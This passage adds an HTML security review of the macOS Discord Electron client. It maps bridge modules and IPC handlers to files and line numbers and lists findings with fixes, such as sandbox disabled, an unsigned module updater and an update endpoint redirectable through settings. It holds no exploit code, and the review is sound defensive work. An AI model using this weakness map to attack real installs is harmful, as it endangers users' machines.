+<thead><tr><th>#</th><th>Member</th><th>Implementation</th><th>Transport</th><th>Basis</th></tr></thead>
+<tbody>
+<tr><td>1</td><td><code>isRenderer</code></td><td>inline <code>process.type === 'renderer'</code></td><td>—</td><td>Source</td></tr>
+<tr><td>2</td><td><code>setUncaughtExceptionHandler</code></td><td>inline, <code>:9-11</code></td><td>—</td><td>Source</td></tr>
+<tr><td>3</td><td><code>nativeModules</code></td><td><code>renderer/nativeModules.js</code></td><td>IPC + dynamic <code>require</code></td><td>Source</td></tr>
+<tr><td>4</td><td><code>process</code></td><td><code>renderer/process.js</code></td><td>direct</td><td>Source</td></tr>
+<tr><td>5</td><td><code>os</code></td><td><code>renderer/os.js</code></td><td>direct</td><td>Source</td></tr>
+<tr><td>6</td><td><code>app</code></td><td><code>renderer/app.js</code></td><td>IPC</td><td>Source</td></tr>
+<tr><td>7</td><td><code>clipboard</code></td><td><code>renderer/clipboard.js</code></td><td><b>direct</b> + partial IPC</td><td>Source · §6.2</td></tr>
+<tr><td>8</td><td><code>ipc</code></td><td><code>renderer/ipc.js</code></td><td>IPC, <b>allow-listed</b></td><td>Source · §8.3</td></tr>
+<tr><td>9</td><td><code>gpuSettings</code></td><td><code>renderer/gpuSettings.js</code></td><td>IPC</td><td>Source</td></tr>
+<tr><td>10</td><td><code>window</code></td><td><code>renderer/window.js</code></td><td>IPC — 19 handlers</td><td>Source</td></tr>
+<tr><td>11</td><td><code>powerMonitor</code></td><td><code>renderer/powerMonitor.js</code></td><td>IPC — 5 channels</td><td>Source</td></tr>
+<tr><td>12</td><td><code>spellCheck</code></td><td><code>renderer/spellCheck.js</code></td><td>IPC</td><td>Source</td></tr>
+<tr><td>13</td><td><code>crashReporter</code></td><td><code>renderer/crashReporter.js</code></td><td>IPC</td><td>Source</td></tr>
+<tr><td>14</td><td><code>desktopCapture</code></td><td><code>renderer/desktopCapture.js</code></td><td>IPC</td><td>Source · §6.3</td></tr>
+<tr><td>15</td><td><code>fileManager</code></td><td><code>renderer/fileManager.js</code> (24.7 KB)</td><td><b>direct <code>fs</code></b> + IPC for paths</td><td>Source · §6.4</td></tr>
+<tr><td>16</td><td><code>clips</code></td><td><code>renderer/clips.js</code></td><td>IPC + custom protocol</td><td>Source · §8.9</td></tr>
+<tr><td>17</td><td><code>processUtils</code></td><td><code>renderer/processUtils.js</code></td><td>IPC — 11 handlers</td><td>Source</td></tr>
+<tr><td>18</td><td><code>powerSaveBlocker</code></td><td><code>renderer/powerSaveBlocker.js</code></td><td>IPC</td><td>Source</td></tr>
+<tr><td>19</td><td><code>http</code></td><td><code>renderer/http.js</code></td><td>IPC (<code>CONSTANTS_GET</code>)</td><td>Source</td></tr>
+<tr><td>20</td><td><code>accessibility</code></td><td><code>renderer/accessibility.js</code></td><td>IPC</td><td>Source</td></tr>
+<tr><td>21</td><td><code>features</code></td><td><code>renderer/features.js</code></td><td>IPC</td><td>Source</td></tr>
+<tr><td>22</td><td><code>settings</code></td><td><code>renderer/settings.js</code></td><td>IPC — 3 channels</td><td>Source</td></tr>
+<tr><td>23</td><td><code>userDataCache</code></td><td><code>renderer/userDataCache.js</code></td><td>IPC — 3 channels</td><td>Source</td></tr>
+<tr><td>24</td><td><code>thumbar</code></td><td><code>renderer/thumbar.js</code></td><td>IPC</td><td>Source</td></tr>
+<tr><td>25</td><td><code>safeStorage</code></td><td><code>renderer/safeStorage.js</code></td><td>IPC <code>sendSync</code></td><td>Source · §5.2</td></tr>
+<tr><td>26</td><td><code>hardware</code></td><td><code>renderer/hardware.js</code></td><td>IPC</td><td>Source</td></tr>
+<tr><td>27</td><td><code>riotGames</code></td><td><code>renderer/riotGames.js</code></td><td><b>direct HTTPS</b></td><td>Source · §9.4</td></tr>
+<tr><td>28</td><td><code>remoteApp</code></td><td>alias → <code>app</code></td><td>—</td><td>Source</td></tr>
+<tr><td>29</td><td><code>remotePowerMonitor</code></td><td>alias → <code>powerMonitor</code></td><td>—</td><td>Source</td></tr>
+<tr><td>30</td><td><code>webAuthn</code></td><td><code>renderer/webauthn.js</code></td><td>IPC — 2 channels</td><td>Source</td></tr>
+</tbody>
+</table>
+
+<p><b>Result: 30 keys, 26 distinct capability modules, 2 aliases, 2 inline values. Zero unresolved.</b>
+Two members (<code>remoteApp</code>, <code>remotePowerMonitor</code>) are legacy aliases retained for
+backward compatibility with older web bundles — a small but real signal that the web app and the
+shell version independently and must stay compatible across a range.</p>
+
+<h3>12.2 Three modules load from disk at runtime — the genuine dynamic edges</h3>
+<table>
+<thead><tr><th>Site</th><th>Expression</th><th>Guard</th></tr></thead>
+<tbody>
+<tr><td><code>renderer/nativeModules.js:44</code></td><td><code>require(name)</code></td><td><code>/^discord_[a-z0-9_-]+$/</code> or <code>'erlpack'</code> (<code>:41</code>)</td></tr>
+<tr><td><code>browser/notifications.js:30</code></td><td><code>require(path.join(moduleDataPath,'discord_notifications'))</code></td><td>fixed name; path from <code>global.moduleDataPath</code></td></tr>
+<tr><td><code>mainScreen.js:376</code></td><td><code>includeOptionalModule('./ElectronTestRpc', …)</code></td><td><b>file absent</b> from the shipped archive — verified against the ASAR index</td></tr>
+</tbody>
+</table>
+
+<h3>12.3 Reconciling the counts</h3>
+<p>The initial analysis reported 49 message names, 85 operations and 33 handlers. Those were partial.
+Verified figures, each independently reproducible:</p>
+<table>
+<thead><tr><th>Metric</th><th>Verified</th><th>Method</th></tr></thead>
+<tbody>
+<tr><td>Canonical IPC channel names</td><td><b>144</b></td><td><code>grep -c 'IPCEvents\["' IPCEvents.js</code></td></tr>
+<tr><td>Main-process registrations (raw)</td><td><b>140</b></td><td>AST-free regex over every <code>ipcMain.on/handle</code>, <code>DiscordIPC.main.on/handle</code> site in <code>app/</code></td></tr>
+<tr><td>— minus 4 generic wrappers</td><td><b>136 concrete</b></td><td><code>DiscordIPC.js:19,24</code> and <code>app/ipcMain.js:11,14</code> are the transports, not endpoints</td></tr>
+<tr><td>Allow-listed send channels</td><td><b>25</b></td><td><code>renderer/ipc.js:9</code></td></tr>
+<tr><td>Allow-listed invoke channels</td><td><b>13</b></td><td><code>renderer/ipc.js:10</code></td></tr>
+<tr><td><code>browser/</code> modules</td><td><b>24</b></td><td>directory listing</td></tr>
+<tr><td><code>renderer/</code> modules</td><td><b>26</b></td><td>directory listing</td></tr>
+</tbody>
+</table>
+<p><b>One caveat on the 136.</b> <code>browser/notifications.js</code> registers the same five channels
+twice — once in a branch that loads the native <code>discord_notifications</code> module
+(<code>:39-55</code>) and once in an Electron fallback branch (<code>:71-83</code>). The branches are
+mutually exclusive at runtime, so the live count on any given host is <b>131</b>. Recorded here
+because this is exactly the kind of detail a raw count gets wrong.</p>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s13">13 · Feature-to-file map</h2>
+
+<p>Each row is traceable end to end. Line numbers are stable — the shipped code is Babel-compiled
+but not minified, so they will hold for build 0.0.380.</p>
+
+<table style="font-size:7.6pt">
+<thead><tr><th>Feature</th><th>Entry point</th><th>Intermediate</th><th>Handler</th><th>Underlying API</th><th>Evidence</th></tr></thead>
+<tbody>
+<tr><td><b>Load the UI</b></td><td><code>app/index.js:89</code></td><td><code>mainScreen.js:61-92</code> <code>getWebappEndpoint()</code></td><td><code>mainScreen.js:304-308</code> <code>loadMainPage()</code></td><td><code>BrowserWindow.loadURL</code></td><td><code>:72, 108-109</code></td></tr>
+<tr><td><b>Expose the bridge</b></td><td><code>mainScreen.js:354</code> <code>webPreferences.preload</code></td><td><code>mainScreenPreload.js:22-48</code></td><td><code>:68</code> <code>exposeInMainWorld</code></td><td><code>contextBridge</code></td><td><code>:68-71</code></td></tr>
+<tr><td><b>Encrypt a secret</b></td><td><code>DiscordNative.safeStorage.encryptString</code></td><td><code>renderer/safeStorage.js:15-17</code></td><td><code>browser/safeStorage.js:15</code></td><td><code>electron.safeStorage</code> → Keychain</td><td>§5.2</td></tr>
+<tr><td><b>Read the clipboard</b></td><td><code>DiscordNative.clipboard.read</code></td><td>— (no IPC)</td><td>— (preload-resident)</td><td><code>electron.clipboard.readText</code></td><td><code>renderer/clipboard.js:43-45</code></td></tr>
+<tr><td><b>List screens to share</b></td><td><code>DiscordNative.desktopCapture.getSources</code></td><td><code>renderer/desktopCapture.js</code></td><td><code>browser/desktopCapturer.js:15-26</code></td><td><code>electron.desktopCapturer</code></td><td>§6.3</td></tr>
+<tr><td><b>Save a file</b></td><td><code>DiscordNative.fileManager.saveWithDialog</code></td><td><code>renderer/fileManager.js:115-131</code></td><td><code>browser/fileManager.js:24-26</code> (dialog only)</td><td><code>dialog.showSaveDialog</code> then <code>fs.writeFileSync</code> in preload</td><td><code>renderer/:123</code></td></tr>
+<tr><td><b>Open a file</b></td><td><code>DiscordNative.fileManager.openFiles</code></td><td><code>renderer/fileManager.js:628-631</code></td><td><code>browser/fileManager.js:27-29</code></td><td><code>dialog.showOpenDialog</code> + <code>readFulfilledFiles</code></td><td><code>common/fileutils.js</code></td></tr>
+<tr><td><b>Detect idle / away</b></td><td>OS power event</td><td><code>browser/powerMonitor.js</code></td><td>4 <code>POWER_MONITOR_*</code> channels</td><td><code>electron.powerMonitor</code></td><td><code>renderer/powerMonitor.js:13-33</code></td></tr>
+<tr><td><b>Keep display awake</b></td><td><code>DiscordNative.powerSaveBlocker.*</code></td><td><code>renderer/powerSaveBlocker.js:10-16</code></td><td><code>browser/powerSaveBlocker.js:10-19</code></td><td><code>electron.powerSaveBlocker</code></td><td>3 channels</td></tr>
+<tr><td><b>Fast-boot cache</b></td><td><code>DiscordNative.userDataCache.*</code></td><td><code>renderer/userDataCache.js:10-17</code></td><td><code>browser/userDataCache.js:45-53</code></td><td><code>fs.writeFile</code> → <code>userDataCache.json</code></td><td><code>:16-21</code></td></tr>
+<tr><td><b>Domain migration</b></td><td>— automatic</td><td><code>mainScreen.js:55-59</code></td><td><code>browser/userDataCache.js:35-44</code></td><td><code>fs.unlink</code> + create <code>domainMigrated</code></td><td>§11.3</td></tr>
+<tr><td><b>Install a native module</b></td><td><code>DiscordNative.nativeModules.ensureModule</code></td><td><code>renderer/nativeModules.js:29-39</code></td><td><code>browser/nativeModules.js:47-72</code></td><td><code>moduleUpdater.install</code> → HTTPS → <code>yauzl</code></td><td>§5.3</td></tr>
+<tr><td><b>Load a native module</b></td><td><code>DiscordNative.nativeModules.requireModule</code></td><td>regex gate <code>:41</code></td><td>— (preload)</td><td><code>require(name)</code></td><td><code>:40-45</code></td></tr>
+<tr><td><b>Host update</b></td><td>startup</td><td><code>moduleUpdater.js:232-291</code></td><td><code>app_bootstrap/hostUpdater.js</code></td><td>Squirrel.Mac feed URL</td><td><code>:274</code></td></tr>
+<tr><td><b>Open external link</b></td><td>click in renderer</td><td><code>mainScreen.js:436-449</code></td><td><code>securityUtils.js:25-31</code></td><td><code>shell.openExternal</code></td><td>§5.4</td></tr>
+<tr><td><b>Popout window</b></td><td><code>window.open(url,'DISCORD_…')</code></td><td><code>mainScreen.js:441-442</code></td><td><code>popoutWindows.js:30-45, 142</code></td><td><code>BrowserWindow</code> + same preload</td><td><code>:160-168</code></td></tr>
+<tr><td><b>Desktop notification</b></td><td><code>DiscordNative.…NOTIFICATIONS_SEND</code></td><td>IPC</td><td><code>browser/notifications.js:45</code> or <code>:77</code></td><td>native <code>discord_notifications</code> or Electron</td><td>§12.3</td></tr>
+<tr><td><b>Block screenshots</b></td><td><code>WINDOW_SET_CONTENT_PROTCTION</code></td><td>IPC</td><td><code>browser/window.js:127-139</code></td><td><code>win.setContentProtection</code></td><td>§8.10</td></tr>
+<tr><td><b>Riot rich presence</b></td><td><code>DiscordNative.riotGames.fetchLiveClientData</code></td><td>— (no IPC)</td><td>— (preload)</td><td><code>https.request</code> → <code>127.0.0.1:2999</code>, pinned CA</td><td>§9.4</td></tr>
+<tr><td><b>Serve a clip</b></td><td><code>discord-clip://</code> URL</td><td><code>browser/clips.js:52-58</code></td><td><code>:61-72</code> metadata check</td><td><code>createReadStream</code> + <code>Range</code></td><td>§8.9</td></tr>
+<tr><td><b>Spellcheck</b></td><td><code>context-menu</code> event</td><td><code>mainScreen.js:536-538</code></td><td><code>browser/spellCheck.js:7-36</code></td><td><code>session.spellChecker*</code></td><td>4 channels</td></tr>
+<tr><td><b>Crash report</b></td><td>uncaught exception</td><td><code>crashReporterSetup.js:55-74</code></td><td><code>browser/crashReporter.js:10,35</code></td><td>Sentry + Crashpad minidump</td><td>§8.7</td></tr>
+<tr><td><b>Startup analytics</b></td><td>internal timers</td><td><code>common/analytics.js:29</code> local queue</td><td><code>mainScreen.js:765-783</code> relay</td><td><b>web app transmits</b></td><td>§6.5</td></tr>
+<tr><td><b>Tray icon</b></td><td><code>SYSTEM_TRAY_SET_ICON</code></td><td>IPC (allow-listed)</td><td><code>systemTray.js:69-70</code></td><td><code>electron.Tray</code></td><td>allow-list <code>ipc.js:9</code></td></tr>
+<tr><td><b>Hardware passkey</b></td><td><code>DiscordNative.webAuthn.*</code></td><td><code>renderer/webauthn.js</code></td><td><code>browser/webauthn.js:18-21</code></td><td>macOS platform authenticator</td><td>2 channels</td></tr>
+<tr><td><b>Game activity index</b></td><td><code>SEARCH_INDEX_DOMAINS</code> etc.</td><td>IPC (invoke allow-list)</td><td><code>browser/intents.js:16-36</code></td><td>native intents module</td><td>6 handlers</td></tr>
+</tbody>
+</table>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s14">14 · Findings &amp; remediation</h2>
+
+<table>
+<thead><tr><th>ID</th><th>Finding</th><th>Class</th><th>Impact</th><th>Remediation</th></tr></thead>
+<tbody>
+<tr><td><b>F-1</b></td><td><code>sandbox:false</code> keeps full Node in the preload, in-process with remote content</td><td>Design</td><td><b>High</b> — converts a renderer compromise into user-level code execution</td><td>Move <code>fs</code>/<code>clipboard</code>/<code>https</code> to main; enable <code>sandbox:true</code></td></tr>
+<tr><td><b>F-7</b></td><td>Legacy module updater verifies no signature; trusts TLS + HTTP 200</td><td>Potential</td><td><b>High</b> if the endpoint or a CA is compromised; it loads native code</td><td>Sign archives, verify before extraction, fail closed</td></tr>
+<tr><td><b>F-6</b></td><td><code>insideAuthFlow</code> fully suspends the origin fence, unbounded and untimed</td><td>Potential</td><td><b>Medium-High</b></td><td>Origin allow-list + timeout; clear on <code>did-navigate</code>, not on a renderer message; ideally a preload-less window</td></tr>
+<tr><td><b>F-10</b></td><td><code>settings.json</code> can redirect <code>UPDATE_ENDPOINT</code>; chains with F-7</td><td>Design / abuse</td><td><b>Medium</b> — persistence, not escalation</td><td>Sign the settings file, or pin the endpoint on stable channels</td></tr>
+<tr><td><b>F-4</b></td><td>No handler validates <code>event.senderFrame</code> across 136 registrations</td><td>Design</td><td><b>Medium</b> — no defence in depth behind F-6</td><td><b>One ~5-line change</b> in <code>DiscordIPC.main.on/handle</code> covers all of them</td></tr>
+<tr><td><b>F-9</b></td><td><code>discord-clip://</code> validates content, not path</td><td>Potential</td><td><b>Low-Medium</b> — bounded file read</td><td><code>path.resolve</code> + containment assertion</td></tr>
+<tr><td><b>F-5</b></td><td>External-URL protocol filter is a nine-entry deny-list on legacy <code>url.parse</code></td><td>Potential</td><td><b>Low-Medium</b>, host-dependent</td><td>Invert to an allow-list; use WHATWG <code>URL</code></td></tr>
+<tr><td><b>F-3</b></td><td><code>media</code> granted to k-id origins but not <code>discord.com</code>; request/check handlers disagree</td><td>Unknown</td><td>Informational — relocates the voice audit surface to native code</td><td>Reconcile the two handlers; document intent</td></tr>
+<tr><td><b>F-8</b></td><td>Zip-slip blocked by <code>yauzl</code>, not by application code</td><td>Mitigated</td><td>None today; silent regression risk</td><td>Add an explicit containment check</td></tr>
+<tr><td><b>F-2</b></td><td>Permission handlers terminate in <code>callback(false)</code></td><td><b>Positive</b></td><td>—</td><td>None — this is correct</td></tr>
+<tr><td>—</td><td>IPC allow-lists with hard throw on the generic façade</td><td><b>Positive</b></td><td>—</td><td>Extend coverage to typed modules (see F-4)</td></tr>
+<tr><td>—</td><td><code>setWindowOpenHandler</code> returns <code>{action:'deny'}</code> on every path</td><td><b>Positive</b></td><td>—</td><td>None</td></tr>
+<tr><td>—</td><td><code>FINISH_UPDATER_BOOTSTRAP</code> type-checks its arguments (<code>'You tried.'</code>)</td><td><b>Positive</b></td><td>—</td><td>None</td></tr>
+</tbody>
+</table>
+
+<div class="card ok">
+<h4>Overall assessment</h4>
+<p>This is a <b>better-than-average Electron client</b>. Context isolation is on, Node integration is
+off, permissions are deny-by-default with real origin checks, window creation is explicitly denied
+by default, and the IPC vocabulary is centralised and namespaced. Someone thought about this — the
+<code>'You tried.'</code> error message and the nine-entry protocol deny-list are both fingerprints of
+real adversarial review.</p>
+<p>Its weaknesses are coherent rather than careless, and they trace to two decisions: <b>keeping Node
+in the preload</b> (F-1), which removes the sandbox as a backstop, and <b>trusting the renderer
+wholesale</b> (F-4) rather than per-handler, which means the perimeter controls in §8.2 and §8.6 have
+nothing behind them. The single highest-leverage fix is not either of those: it is adding a sender
+check inside <code>DiscordIPC</code>, which would retrofit defence in depth onto all 136 endpoints at
+once.</p>
+<p>The <b>largest unknown</b> is update verification (F-7). On macOS the legacy, unsigned path is the
+default, and the modern path's integrity logic is in compiled Rust that this analysis could not
+read. Until that is decompiled, the question "can Discord's update channel install arbitrary native
+code" has no evidence-backed answer.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s15">15 · Unresolved questions</h2>
+
+<ol>
+<li><b>Does the native (Rust) updater verify signatures?</b> Blocks F-7. Requires Ghidra/Hopper on
+<code>discord_dispatch</code>. <i>Highest priority.</i></li>
+<li><b>Is the <code>insideAuthFlow</code> window reachable or extendable by an attacker?</b> Blocks
+F-6. Requires runtime test step 4 (§10.2).</li>
+<li><b>Which <code>DiscordNative</code> members does the web bundle actually call?</b> Determines the
+real attack surface and the cost of fixing F-1. Requires test step 1.</li>
+<li><b>How does <code>discord_voice</code> capture audio,</b> given that Chromium's <code>media</code>
+permission is not granted to <code>discord.com</code> (F-3)? 81 MB of compiled code.</li>
+<li><b>Does <code>global.DiscordNative</code> (<code>mainScreenPreload.js:69-71</code>) behave
+differently from the <code>contextBridge</code> copy?</b> It is a second reference into the same object
+graph, set after <code>process.once('loaded')</code>. Worth one console check.</li>
+<li><b>What does <code>GPU_SETTINGS_SET_CHROMIUM_SWITCHES</code> accept?</b> Chromium switches are a
+powerful sink and this pass did not read the validation.</li>
+<li><b>Why do <code>setPermissionRequestHandler</code> and <code>setPermissionCheckHandler</code>
+disagree about <code>media</code>?</b> Benign asymmetry or oversight.</li>
+<li><b>Does the <code>request</code>-library fallback (§9.3) weaken certificate validation</b> relative
+to the Electron path it replaces?</li>
+<li><b>What reaches the <code>isStaff</code> Sentry project,</b> and can an outsider set that tag? The
+tag originates in the web app.</li>
+<li><b>Is <code>ElectronTestRpc</code> present in any shipped channel?</b> Absent from stable
+0.0.380; canary and PTB not examined.</li>
+</ol>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s16">16 · Appendix — method &amp; reproduction</h2>
+
+<p><b>Tooling.</b> Analysis was performed with a purpose-built in-memory ASAR reader
+(<code>asarq.py</code>, ~60 lines) that parses the archive header and serves <code>list</code>,
+<code>cat</code> (with line numbers) and <code>grep</code> without unpacking 2,448 files to disk. The
+handler census used a second script over the same index. REA (<code>rea-agents</code> 6.7.0) produced
+the initial structural survey — 2,159 entries, 2,032 files parsed, 906,202 AST nodes visited, 8,288
+findings — which located the bridge and the IPC graph; the <code>DiscordNative</code> enumeration,
+every line number, and all security analysis above were done by direct source reading, because the
+automated pass explicitly reported the bridge as unresolvable (§12).</p>
+
+<p><b>Subjects.</b></p>
+<pre>/Applications/Discord.app/Contents/Resources/app.asar
+    sha256  18d09f41a841c3dacfde6b26ac7cdd92fb0fa27bd4ec72809e11e92864f73b6a
+    1076 entries · 39 launcher source files
+
+~/Library/Application Support/discord/0.0.380/modules/discord_desktop_core/core.asar
+    2448 entries · 2032 JS files · ~70 hand-written sources
+    host 1.0.9208 · module 0.0.380 · macOS arm64</pre>
+
+<p><b>Reproducing any citation.</b></p>
+<pre>python3 asarq.py cat   core.asar app/mainScreen.js 335 560
+python3 asarq.py grep  core.asar "contextIsolation|sandbox|setPermission" app/
+python3 asarq.py list  core.asar | grep -v node_modules
+grep -c 'IPCEvents\["' app/node_modules/@discordapp/discord-native-types/IPCEvents.js   # → 144</pre>
+
+<p><b>Scope discipline.</b> No requests were sent to Discord infrastructure beyond what the installed
+client does on its own. No accounts were accessed, no authentication was bypassed, no binaries were
+executed for analysis, and no unverified native modules were installed. Compiled native modules were
+inventoried but not decompiled, which is the principal boundary of this report. Every count and line
+number above was produced by a command that can be re-run against the same two archives.</p>
+
+<hr>
+<p class="small ctr">Static analysis of a locally installed application for defensive security
+review and interoperability research. Confidence labels are applied per finding; absence of evidence
+is recorded as such rather than resolved by inference.</p>
+
+<script>
+  mermaid.initialize({
+    startOnLoad: true,
+    theme: 'base',
+    themeVariables: {
+      fontFamily: '-apple-system, Helvetica Neue, Arial, sans-serif',
+      fontSize: '12px',
+      primaryColor: '#f6f7f9',
+      primaryTextColor: '#15171c',
+      primaryBorderColor: '#6b7280',
+      lineColor: '#5b6372',
+      secondaryColor: '#eef1f5',
+      tertiaryColor: '#ffffff',
+      actorBkg: '#f6f7f9',
+      actorBorder: '#6b7280',
+      actorTextColor: '#15171c',
+      signalColor: '#3d4350',
+      signalTextColor: '#15171c',
+      noteBkgColor: '#fdeccd',
+      noteBorderColor: '#9a6200',
+      noteTextColor: '#15171c'
+    },
+    flowchart: { useMaxWidth: true, htmlLabels: true, curve: 'basis', padding: 10 },
+    sequence: { useMaxWidth: true, wrap: true, width: 170, actorMargin: 34, boxMargin: 8, noteMargin: 8 }
+  });
+</script>
+</body>
+</html>
